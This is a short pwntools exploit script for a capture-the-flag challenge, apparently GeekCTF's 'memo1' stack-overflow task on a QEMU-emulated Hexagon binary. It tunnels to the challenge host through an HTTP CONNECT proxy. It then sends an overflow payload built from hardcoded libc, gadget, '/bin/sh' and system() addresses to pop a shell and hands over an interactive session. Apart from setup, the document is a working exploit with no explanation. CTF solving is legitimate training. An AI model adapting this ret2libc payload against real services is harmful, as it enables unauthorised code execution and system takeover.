#!/usr/bin/env python3
#-*- coding: utf-8 -*-
from pwn import*
import os

context(os = 'linux', arch = 'i386', log_level = 'debug', terminal = ['tmux', 'new-window'])

def debug(cmd = ''):
	if len(sys.argv)!=1:
		return
	cmd += """
	"""
	gdb.attach(p, cmd)
	pause()

#nc -X connect -x instance.chall.geekctf.geekcon.top:18081 crke9qvjee8mwtj8 1
def exp(host = "chall.geekctf.geekcon.top", port=18081, exe = "./memo1"):
  global p

  libcbase = 0x40810000
  gadget = 0x000204B4
  binsu = libcbase + 0x0012279
  system = libcbase + 0x000BB920
  fp = 0x4080fce0
  fp += 0x100
  # p = process("docker-compose run --rm stkbof qemu-hexagon -L libc -d in_asm,exec,cpu -dfilter 0x40810000+0x300 -strace -D /tmp/log ./chall".split(" "))

  p = remote(host, port)
  p.send(b'CONNECT rbxgkrrv782pg9y9:1 HTTP/1.0\r\n\r\n')
  p.recvline()

  pass
  p.recvuntil("Do you know \"stack buffer overflow\"?\n")
  # 0x4080fd10
  payload = (p32(0)*2 + p32(binsu) + p32(0xffffffff) + p32(fp + 0x200) + p32(system)).ljust(0x100, b"\x90") + p32(fp - 0xf0) + p32(gadget)
  # print(payload)
  p.send(payload)

  
if __name__ == '__main__':
	exp()
	p.interactive()


